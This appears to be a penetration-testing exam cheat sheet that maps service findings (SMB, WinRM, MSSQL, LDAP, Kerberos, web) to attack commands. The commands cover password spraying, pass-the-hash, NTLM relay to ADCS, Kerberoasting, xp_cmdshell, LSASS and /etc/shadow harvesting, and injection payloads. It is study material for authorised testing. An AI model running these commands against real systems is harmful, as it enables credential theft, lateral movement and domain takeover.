# Exam Decision Dashboard

> **Credentials found? → `../operator/CREDENTIAL_DECISION_TREE.md`**
> This dashboard covers service findings (SMB, WinRM, etc.). For credential handling decisions, use the decision tree.

## How to Use This Document

Single-file quick reference for rapid lookup during the exam. Each section answers "I found X — what do I do?" Maximum usability. Minimum reading. Designed for glance-and-act.

---

## What Do I Do If I Find SMB? (Port 445)

```
1. NULL SESSION CHECK (PRIORITY):
   smbclient -N -L //target
   rpcclient -U "" -N target enumdomusers
   enum4linux -a target
   → Users? → Password spray

2. SIGNING CHECK:
   nmap --script smb2-security-mode -p 445 target
   → Disabled? → SMB relay setup

3. VULN CHECK:
   nmap --script smb-vuln-* -p 445 target

4. IF CREDS AVAILABLE:
   netexec smb target -u user -p pass --shares
   smbmap -H target -u user -p pass -R

5. WRITABLE SHARE?
   → Web shell upload / SCF attack / Startup script
```

---

## What Do I Do If I Find WinRM? (Port 5985/5986)

```
1. CREDS AVAILABLE?
   evil-winrm -i target -u user -p pass
   evil-winrm -i target -u user -H hash

2. NO CREDS? → Password spray:
   netexec winrm target -u users.txt -p common.txt

3. POST-ACCESS:
   whoami /priv → Check SeImpersonate
   whoami /groups → Check AD groups
   systeminfo → OS version
   netstat -ano → Connections

   → Admin? → LSASS dump
   → Non-admin? → Potato exploit → SYSTEM
```

---

## What Do I Do If I Find a Password?

```
1. CLASSIFY:
   ├── Domain? → BloodHound + Kerberoast + Spray
   ├── Local? → Test on host + test ALL hosts
   └── Service? → Check SPN + test service host

2. TEST EVERYWHERE (netexec sweep):
   netexec smb <subnet>/24 -u user -p pass
   netexec winrm <subnet>/24 -u user -p pass
   netexec ssh <subnet>/24 -u user -p pass
   netexec mssql <subnet>/24 -u user -p pass

3. IF HASH:
   ├── PTH immediately: psexec.py -hashes :hash user@target
   └── Crack background: hashcat -m 1000/5600 hash.txt rockyou.txt
```

---

## What Do I Do If I Find a Hash?

```
1. IDENTIFY TYPE:
   ├── NTLM (-m 1000) → PTH NOW: psexec,wmiexec,evil-winrm
   ├── NetNTLMv2 (-m 5600) → Crack + check relay
   ├── Kerberos TGS (-m 13100) → Crack (bg) → Service account
   └── AS-REP (-m 18200) → Crack (bg) → Domain user

2. CRACK IN BACKGROUND:
   hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

3. PTH (if NTLM):
   psexec.py -hashes :hash user@target
   wmiexec.py -hashes :hash user@target
   evil-winrm -i target -u user -H hash

4. RELAY (if NetNTLMv2 + signing disabled):
   ntlmrelayx.py -tf targets.txt -smb2support
   ntlmrelayx.py -t http://DC/certsrv -adcs
```

---

## What Do I Do If I Find MSSQL? (Port 1433)

```
1. DEFAULT CREDS:
   mssqlclient.py sa:sa@target
   mssqlclient.py sa:admin@target
   mssqlclient.py admin:admin@target

2. IF AUTHENTICATED:
   enable_xp_cmdshell
   xp_cmdshell whoami
   → SYSTEM? → LSASS dump
   → Service account? → Check domain

3. ENUM SQL:
   SELECT name FROM sys.databases
   SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES
   Search user tables for credentials

4. LINKED SERVERS:
   SELECT * FROM sys.servers
   → Linked? → xp_cmdshell through link
```

---

## What Do I Do If I Find a Shell?

```
1. IMMEDIATE ENUM:
   whoami/id, hostname, ip addr/ifconfig/ipconfig
   ip route / route print, netstat -ano, arp -a

2. CHECK DOMAIN:
   Linux: realm list, klist, cat /etc/krb5.keytab
   Windows: systeminfo | findstr Domain, echo %USERDOMAIN%

3. CREDENTIAL HARVEST:
   ├── Linux: /etc/shadow, .ssh, configs, bash history
   └── Windows: SAM, LSASS, browser, configs (admin needed)

4. PRIVESC CHECK:
   Linux: sudo -l, SUID, caps, cron, pspy
   Windows: whoami /priv, winPEAS, service misconfigs

5. PIVOT CHECK:
   Multi-homed? Additional subnets?
   → Ligolo-ng (root) / Chisel (no root)
```

---

## What Do I Do If I Find a Web Server? (Port 80/443)

```
1. FINGERPRINT (whatweb, curl -I)

2. CONTENT DISCOVERY:
   ffuf -u <target>/FUZZ -w /directory-list-2.3-medium.txt
   Check robots.txt, sitemap.xml, page source

3. INJECTION CHECK (test ALL params):
   SQLi: ' " ) -- #
   LFI: ../../../etc/passwd
   CMDi: ; | && ||
   XSS: <script>alert(1)</script>

4. FILE UPLOAD? → Bypass + webshell

5. CMS? → wpscan/joomscan/droopescan
```

---

## What Do I Do If I Find LDAP? (Port 389/636)

```
1. ANONYMOUS BIND CHECK:
   ldapsearch -x -h target -b "dc=domain,dc=local"
   → Success? → Dump ALL users, groups, computers

2. AUTHENTICATED (if creds available):
   bloodhound-python -u user -p pass -d domain -ns target
   ldapdomaindump -u domain\\user -p pass target

3. LDAP SIGNING CHECK:
   → Not enforced? → LDAP relay possible
```

---

## What Do I Do If I Find Kerberos? (Port 88)

```
1. USER ENUM (Kerbrute):
   kerbrute userenum -d domain --dc DC names.txt

2. AS-REP ROAST (no creds needed):
   GetNPUsers -dc-ip DC domain/ -usersfile users.txt
   → Hash → crack -m 18200 → Domain user

3. IF DOMAIN CREDS:
   Kerberoast: GetUserSPNs -request
   BloodHound: bloodhound-python
```

---

## What Do I Do If I Find a Domain Credential?

```
1. BLOODHOUND IMMEDIATELY:
   bloodhound-python -u user -p pass -d DOMAIN -ns DC

2. KERBEROAST:
   GetUserSPNs -dc-ip DC domain/user:pass -request

3. TEST EVERYWHERE:
   netexec smb <subnet>/24 -u user -p pass

4. BLOODHOUND ANALYSIS:
   └── Find DA path → Execute

5. ADCS CHECK:
   certipy find -u user@domain -p pass -dc-ip DC
```

---

## What Do I Do If I Find an NTLM Hash?

```
1. PASS-THE-HASH (immediate):
   psexec.py -hashes :hash user@target
   wmiexec.py -hashes :hash user@target
   evil-winrm -i target -u user -H hash

2. CRACK (background):
   hashcat -m 1000 hash.txt rockyou.txt

3. TEST HASH ACROSS ALL HOSTS:
   netexec smb <subnet>/24 -u user -H hash
   netexec winrm <subnet>/24 -u user -H hash
```

---

## What Do I Do If I Find an SSH Key?

```
1. USE IT:
   chmod 600 id_rsa
   ssh -i id_rsa user@host

2. TEST ON OTHER HOSTS:
   Same key often reused

3. POST-ACCESS:
   Linux privesc, domain check, config creds, pivot
```

---

## What Do I Do If I Find Responder Hashes?

```
1. CRACK (background):
   hashcat -m 5600 hash.txt rockyou.txt

2. RELAY (if signing disabled):
   ntlmrelayx.py -tf targets.txt -smb2support
   ntlmrelayx.py -t http://DC/certsrv -adcs

3. CONTINUE RESPONDER (never stop until AD done)
```

---

## What Do I Do If I Find a Service Account?

```
1. BLOODHOUND: Is service account privileged?
   ├── In Domain Admins? → DA
   ├── Delegation? → DA via S4U
   └── No special group? → Test service host → Lateral

2. TEST SERVICE HOST:
   netexec smb <service_host> -u svc_acct -p pass
   netexec winrm <service_host> -u svc_acct -p pass

3. KERBEROAST (if SPN):
   Already have TGS? Crack it
```

---

## What Do I Do If I Get Stuck?

```
1. NO INITIAL ACCESS?
   ├── Full TCP scan (-p-) on ALL hosts?
   ├── UDP scan (SNMP, TFTP)?
   ├── Default creds on ALL services?
   ├── SMB null session?
   ├── LDAP anonymous?
   ├── Responder running?
   ├── AS-REP roast tried?
   ├── ffuf with bigger wordlists?
   └── Version-specific exploits checked?

2. NO PRIVESC?
   ├── Linux: sudo -l, SUID, caps, cron, pspy, kernel
   ├── Windows: potato, services, tokens, AlwaysInstallElevated
   └── Some hosts don't escalate → harvest creds, move on

3. NO AD PATH?
   ├── BloodHound with ALL collection methods?
   ├── Kerberoast?
   ├── AS-REP roast?
   ├── ADCS check?
   ├── Delegation check?
   ├── More hosts compromised (different users)?
   └── Password spray with more patterns?

4. STILL STUCK?
   ├── Take 15-min break
   ├── Re-read scope (did you miss something?)
   ├── Review notes from start (missed finding?)
   └── Reset environment (last resort)
```

---

## Quick Action Reference

```
┌──────────────────┬────────────────────────────────────┐
│ FINDING          │ FIRST ACTION                       │
├──────────────────┼────────────────────────────────────┤
│ SMB port open    │ Check null session + signing       │
│ Web server       │ ffuf + injection check             │
│ WinRM open       │ Spray + evil-winrm if creds        │
│ LDAP open        │ Anonymous bind check               │
│ Kerberos open    │ AS-REP roast + user enum           │
│ MSSQL open       │ Default creds + xp_cmdshell        │
│ NFS open         │ Mount + look for SSH keys          │
│ FTP open         │ Anonymous + file download          │
│ Hash found       │ PTH (NTLM) + crack (bg)            │
│ Password found   │ Test EVERYWHERE                    │
│ Shell obtained   │ Enum + cred hunt + privesc         │
│ Domain cred      │ BloodHound + Kerberoast            │
│ Multi-homed      │ Pivot deploy + new subnet scan     │
│ ADCS found       │ certipy find + ESC chain           │
│ Stuck            │ Checklist above + break            │
└──────────────────┴────────────────────────────────────┘
```

---

## Top 10 Commands to Have Handy

```bash
netexec smb <subnet>/24 -u <user> -p <pass>
netexec winrm <subnet>/24 -u <user> -p <pass>
psexec.py -hashes :<hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <hash>
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc>
GetUserSPNs -dc-ip <dc> <domain>/<user>:<pass> -request
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc>
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
secretsdump.py -just-dc <domain>/<user>:<pass>@<dc>
ntlmrelayx.py -t http://<dc>/certsrv -smb2support -adcs
```

---

## Cross-References

- Detailed loot priorities → [loot-priority-framework.md](loot-priority-framework.md)
- Credential handling → [../operator/CREDENTIAL_DECISION_TREE.md](../operator/CREDENTIAL_DECISION_TREE.md)
- Attack chain execution → [high-probability-paths.md](high-probability-paths.md)
- Operational playbook → [exam-execution-playbook.md](exam-execution-playbook.md)
- Full methodology → [modules/](../modules/)
